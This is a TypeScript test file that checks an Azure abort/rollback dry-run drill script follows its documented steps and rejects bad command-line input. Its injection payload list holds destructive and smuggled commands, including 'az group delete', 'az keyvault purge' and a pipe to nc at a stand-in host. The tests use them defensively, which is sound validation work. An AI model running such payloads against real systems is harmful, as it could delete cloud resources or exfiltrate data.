// R2-D1 — Azure drill scripts
//
// Adversarial coverage for deploy/azure-abort-rollback-dry-run.mjs: Drill A
// (first-deployment abort, 8-minute threshold) and Drill B (revision/config
// rollback, 5-minute objective) vs docs/operations/azure-abort-and-
// rollback-drills.md. Round-1 lanes never touch deploy/*.mjs; live-mode
// spawn gating and write-inertia execution proofs live in
// r2-d1-azure-drills-live-gating.test.ts. Hermetic: this file never passes
// --live, so nothing is spawned.
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { readFileSync } from "node:fs";
import { promisify } from "node:util";
import test from "node:test";

const execFileAsync = promisify(execFile);
const SCRIPT = new URL("../../deploy/azure-abort-rollback-dry-run.mjs", import.meta.url).pathname;

interface ScriptResult {
  code: number;
  stdout: string;
  stderr: string;
}

async function runScript(args: readonly string[]): Promise<ScriptResult> {
  try {
    const { stdout, stderr } = await execFileAsync(process.execPath, [SCRIPT, ...args], {
      timeout: 20_000,
      maxBuffer: 10 * 1024 * 1024,
    });
    return { code: 0, stdout, stderr };
  } catch (error) {
    const failure = error as { code?: unknown; stdout?: unknown; stderr?: unknown };
    assert.equal(typeof failure.code, "number", `the script must exit with a numeric code, got ${String(failure.code)}`);
    return {
      code: failure.code as number,
      stdout: typeof failure.stdout === "string" ? failure.stdout : "",
      stderr: typeof failure.stderr === "string" ? failure.stderr : "",
    };
  }
}

// The --revision value is interpolated UNQUOTED into the printed drill
// commands (`--revision ${revision}`), so breakout payloads previously read
// as executable mutations in the [WRITE]-marked steps.
const INJECTION_PAYLOADS: ReadonlyArray<readonly [string, string]> = [
  ["command separator", "x; az containerapp delete"],
  ["list separator", "x && az group delete"],
  ["pipe exfiltration shape", "x | nc evil.example 443"],
  ["command substitution", "$(az keyvault purge)"],
  ["backtick substitution", "`az containerapp revision deactivate --revision other`"],
  ["double-quote breakout", 'x" --name "victim'],
  ["single-quote breakout", "x' --force '"],
  ["newline smuggling", "x\naz containerapp ingress enable"],
  ["carriage-return smuggling", "x\r--malicious"],
  ["ANSI escape sequence", "x\u001b[31m"],
  ["leading whitespace", " x"],
  ["empty value", ""],
];

test("R2-D1 abort/rollback: shell-metacharacter payloads fail closed on every interpolated flag", async () => {
  for (const flag of ["--app", "--rg", "--revision"] as const) {
    for (const [label, payload] of INJECTION_PAYLOADS) {
      const { code, stdout, stderr } = await runScript([flag, payload]);
      assert.equal(code, 2, `${flag} ${label}: must exit 2`);
      assert.equal(stdout, "", `${flag} ${label}: nothing may be printed before validation fails`);
      assert.ok(stderr.startsWith("azure-abort-rollback-dry-run: "), `${flag} ${label}: bounded stderr names the script`);
      assert.ok(stderr.includes(flag), `${flag} ${label}: stderr names the offending flag`);
      assert.ok(!stderr.includes("at "), `${flag} ${label}: no stack trace leaks`);
    }
  }
});

test("R2-D1 abort/rollback: --drill selection fails closed on invalid shapes with exit 2 and no stack trace", async () => {
  const cases: Array<readonly [string, string[], RegExp]> = [
    ["unknown drill letter", ["--drill", "C"], /unknown drill "C"/u],
    ["multi-character drill", ["--drill", "AB"], /unknown drill "AB"/u],
    ["drill swallows the next flag", ["--drill", "--live"], /requires a value/u],
    ["trailing --drill with no value", ["--drill"], /requires a value/u],
  ];
  for (const [label, args, pattern] of cases) {
    const { code, stdout, stderr } = await runScript(args);
    assert.equal(code, 2, `${label}: must exit 2 with a clean usage error (previously threw an uncaught exception)`);
    assert.equal(stdout, "", `${label}: no drill may be printed`);
    assert.match(stderr, pattern, `${label}: stderr carries the bounded reason`);
    assert.match(stderr, /usage: /u, `${label}: stderr carries the usage line`);
    assert.ok(!stderr.includes("at file://") && !stderr.includes("Error: Unknown drill"), `${label}: no stack trace, no legacy throw shape`);
  }
});

test("R2-D1 abort/rollback: missing values and unknown flags fail closed", async () => {
  for (const flag of ["--app", "--rg", "--revision"] as const) {
    const trailing = await runScript([flag]);
    assert.equal(trailing.code, 2, `trailing ${flag}: must exit 2`);
    assert.match(trailing.stderr, /requires a value/u, `trailing ${flag}: stderr explains the missing value`);
    const swallowing = await runScript([flag, "--live"]);
    assert.equal(swallowing.code, 2, `${flag} swallowing --live: must exit 2`);
  }
  for (const args of [["--bogus"], ["--drillx", "A"], ["--live=true"], ["--drill=A"]] as const) {
    const { code, stdout, stderr } = await runScript([...args]);
    assert.equal(code, 2, `${args.join(" ")}: must exit 2`);
    assert.equal(stdout, "", `${args.join(" ")}: nothing printed before the flag check`);
    assert.match(stderr, /unknown flag/u, `${args.join(" ")}: stderr names the unknown flag`);
  }
});

test("R2-D1 abort/rollback: Drill A matches the doc's six ordered steps and stop conditions", async () => {
  const { code, stdout, stderr } = await runScript(["--drill", "A", "--app", "poc-app", "--rg", "poc-rg", "--revision", "rev--bad01"]);
  assert.equal(code, 0, "valid Drill A arguments succeed");
  assert.equal(stderr, "");

  assert.match(stdout, /Drill A: first-deployment abort - no rollback target; 8-minute abort threshold; never call this rollback\./u, "the Drill A banner states the doc's invariants");
  const stepOrder = [
    "1. Stop the protected job / automated descendants",
    "2. Verify and keep ingress disabled",
    "3. Deactivate/remove the failed candidate (8-minute abort line)",
    "4. Clear temporary credentials",
    "5. Record evidence",
    "6. Decide within the window",
  ];
  let cursor = 0;
  for (const step of stepOrder) {
    const index = stdout.indexOf(step);
    assert.ok(index >= 0, `Drill A prints "${step}"`);
    assert.ok(index > cursor, `Drill A step order preserves doc sequence at "${step}"`);
    cursor = index;
  }

  assert.match(stdout, /\[read-only\] \$ az containerapp show --name "poc-app" --resource-group "poc-rg" --query "properties\.configuration\.ingress\.external"/u, "step 2 verifies ingress state read-only");
  assert.match(stdout, /\[WRITE\] \$ az containerapp ingress disable --name "poc-app" --resource-group "poc-rg"/u, "step 2 marks ingress disable as WRITE (printed only)");
  assert.match(stdout, /\[read-only\] \$ az containerapp revision list --name "poc-app".*\[?properties\.healthState!='Healthy'\]\.name/u, "step 3 lists unhealthy revisions read-only");
  assert.match(stdout, /\[WRITE\] \$ az containerapp revision deactivate --revision rev--bad01 --name "poc-app"/u, "step 3 substitutes the failing revision unquoted into the WRITE step");

  assert.match(stdout, /never re-enable ingress once the abort path is entered/u, "stop condition: ingress stays disabled");
  assert.match(stdout, /USD 45 -> request teardown\/retention authority/u, "stop condition: USD 45 ceiling");
  assert.match(stdout, /DRY-RUN \(nothing executed\)/u, "dry-run banner");
});

test("R2-D1 abort/rollback: Drill B matches the doc's seven ordered steps, 5-minute objective, and data invariant", async () => {
  const { code, stdout } = await runScript(["--drill", "b", "--app", "poc-app", "--rg", "poc-rg", "--revision", "rev-fail-02"]);
  assert.equal(code, 0, "--drill is case-insensitive (doc writes A|B; operators type lowercase)");

  assert.match(stdout, /Drill B: later revision\/config rollback - 5-minute objective; external data is never snapshot-rolled back\./u, "the Drill B banner states the doc's invariants");
  const stepOrder = [
    "1. Record failing state",
    "2. Restore prior known-good revision",
    "3. Restore separate authConfigs state",
    "4. Reacquire current real data",
    "5. Rerun smoke set",
    "6. Deactivate the failing revision",
    "7. Record evidence",
  ];
  let cursor = 0;
  for (const step of stepOrder) {
    const index = stdout.indexOf(step);
    assert.ok(index >= 0, `Drill B prints "${step}"`);
    assert.ok(index > cursor, `Drill B step order preserves doc sequence at "${step}"`);
    cursor = index;
  }

  // The doc's ordering invariant: the failing state is recorded (read-only)
  // BEFORE any restore write is presented.
  const recordIndex = stdout.indexOf("az containerapp revision list");
  const updateIndex = stdout.indexOf("[WRITE] $ az containerapp update");
  assert.ok(recordIndex >= 0 && updateIndex > recordIndex, "revision list precedes the restore update");

  assert.match(stdout, /\[WRITE\] \$ az containerapp update --name "poc-app" --resource-group "poc-rg" --revision-suffix PRIOR-GOOD-SUFFIX/u, "step 2 restore is marked WRITE (printed only)");
  assert.match(stdout, /\[read-only\] \$ az containerapp ingress show --name "poc-app"/u, "step 2 confirms ingress state read-only");
  assert.match(stdout, /\[WRITE\] \$ az containerapp auth update --name "poc-app"/u, "step 3 authConfigs restore is marked WRITE");
  assert.match(stdout, /managedEnvironments join\/action/u, "step 3 carries the join/action caveat (microsoft/azure-container-apps#530)");
  assert.match(stdout, /\[WRITE\] \$ az containerapp revision deactivate --revision rev-fail-02/u, "step 6 deactivates the failing revision (printed only)");

  assert.match(stdout, /5-minute objective exceeded -> record deviation, stop automated attempts/u, "stop condition: 5-minute objective");
  assert.match(stdout, /DRY-RUN \(nothing executed\)/u, "dry-run banner");
});

test("R2-D1 abort/rollback: the default drill is A and write verbs never lose their WRITE marker in dry-run", async () => {
  const { code, stdout } = await runScript([]);
  assert.equal(code, 0, "no arguments defaults to Drill A dry-run");
  assert.match(stdout, /Azure abort\/rollback drill A/u, "default selection is Drill A");

  // Every mutating command line must carry the WRITE marker; read-only lines
  // the read-only marker. A mislabelled write step would read as executable.
  for (const line of stdout.split("\n")) {
    const trimmed = line.trim();
    if (!trimmed.startsWith("[")) continue;
    if (trimmed.includes("$ az containerapp ingress disable") || trimmed.includes("$ az containerapp revision deactivate") || trimmed.includes("$ az containerapp update") || trimmed.includes("$ az containerapp auth update")) {
      assert.ok(trimmed.startsWith("[WRITE]"), `mutating command must be WRITE-marked: ${trimmed}`);
    } else if (trimmed.includes("$ az ")) {
      assert.ok(trimmed.startsWith("[read-only]"), `inspection command must be read-only-marked: ${trimmed}`);
    }
  }
});

test("R2-D1 abort/rollback: source admits only the documented flags and never spawns a shell", () => {
  const source = readFileSync(SCRIPT, "utf8");
  assert.match(source, /KNOWN_FLAGS = new Set\(\["--drill", "--live", "--app", "--rg", "--revision"\]\)/u, "flag allow-list stays in sync with the usage line");
  assert.ok(!/spawn\([^)]*\{[^}]*shell/u.test(source), "no shell:true spawn option anywhere");
  assert.ok(!source.includes("execSync") && !source.includes("execFile("), "no exec-family spawn (shell-string APIs)");
});
